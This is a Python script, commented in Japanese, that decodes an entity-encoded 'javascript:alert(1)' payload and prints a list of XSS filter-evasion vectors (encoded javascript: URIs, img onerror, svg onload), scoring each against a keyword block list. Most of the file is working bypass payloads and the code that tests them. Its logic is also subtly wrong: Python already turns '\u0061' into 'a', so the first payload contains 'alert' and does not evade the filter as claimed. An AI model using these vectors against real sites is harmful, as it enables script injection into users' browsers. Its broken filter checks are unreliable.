import html
import re

def analyze_encoded_payload():
    payload = "j&#x61;vas&#x63;ript:\u0061lert(1)"
    
    print("=== エンコードペイロード分析 ===")
    print(f"元のペイロード: {payload}")
    
    # HTMLエンティティをデコード
    html_decoded = html.unescape(payload)
    print(f"HTMLデコード後: {html_decoded}")
    
    # Unicodeエスケープをデコード
    try:
        unicode_decoded = html_decoded.encode().decode('unicode_escape')
        print(f"Unicodeデコード後: {unicode_decoded}")
    except:
        print("Unicodeデコード: エラー")
    
    # 段階的にデコード
    step1 = payload.replace('&#x61;', 'a').replace('&#x63;', 'c')
    print(f"ステップ1 (HTMLエンティティ): {step1}")
    
    step2 = step1.replace('\u0061', 'a')
    print(f"ステップ2 (Unicode): {step2}")
    
    print("\n=== 現在のフィルターで検出されるか ===")
    blocked_keywords = [
        'alert', 'script', 'prompt', 'confirm', 
        'console.log', '"', 'javascript:', 'eval',
        'document.', 'window.', 'onerror', 'onload',
        'onclick', 'onmouseover', '<script', '</script>'
    ]
    
    payload_lower = payload.lower()
    detected = False
    for keyword in blocked_keywords:
        if keyword in payload_lower:
            print(f"🔴 検出: {keyword}")
            detected = True
    
    if not detected:
        print("🟢 フィルターを回避: 検出されません")
    
    print("\n=== ブラウザでの動作 ===")
    print("1. HTMLパーサーが &#x61; → 'a', &#x63; → 'c' に変換")
    print("2. JavaScriptエンジンが \\u0061 → 'a' に変換") 
    print("3. 結果: javascript:alert(1)")
    print("4. href属性内なので、クリック時に実行される可能性あり")

if __name__ == "__main__":
    analyze_encoded_payload()

# 実際のテスト用コメント例
test_payloads = [
    "j&#x61;vas&#x63;ript:\u0061lert(1)",
    "j&#97;vas&#99;ript:alert(1)", 
    "javascript:&#97;lert(1)",
    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;",
    "<img src=x on&#101;rror=&#97;lert(1)>",
    "<svg on&#108;oad=&#97;lert(1)>",
]

print("\n=== 回避ペイロード例 ===")
for i, payload in enumerate(test_payloads, 1):
    print(f"{i}. {payload}")
    
    # 簡易フィルター回避チェック
    payload_lower = payload.lower()
    bypassed = True
    blocked_keywords = ['alert', 'script', 'prompt', 'confirm', 'javascript:']
    
    for keyword in blocked_keywords:
        if keyword in payload_lower:
            bypassed = False
            break
    
    if bypassed:
        print("   ✅ フィルター回避可能")
    else:
        print("   ❌ フィルターで検出")